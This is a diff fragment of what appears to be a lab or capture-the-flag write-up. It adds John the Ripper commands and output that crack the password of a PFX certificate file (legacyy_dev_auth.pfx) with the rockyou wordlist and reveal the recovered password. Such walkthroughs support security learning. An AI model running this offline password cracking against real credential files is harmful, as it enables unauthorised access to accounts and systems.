@@ -138,5 +138,20 @@ Archive:  winrm_backup.zip
 ▶ pfx2john legacyy_dev_auth.pfx > legacyy_dev_auth.hash
 ```
 ```CSS
+▶ john legacyy_dev_auth.hash --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x])
+Cost 1 (iteration count) is 2000 for all loaded hashes
+Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+thuglegacy       (legacyy_dev_auth.pfx)     
+1g 0:00:02:12 DONE (2023-08-02 19:36) 0.007573g/s 24469p/s 24469c/s 24469C/s thuglife06..thugers1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
 
+▶ john legacyy_dev_auth.hash --show
+legacyy_dev_auth.pfx:thuglegacy:::::legacyy_dev_auth.pfx
+
+1 password hash cracked, 0 left
 ```
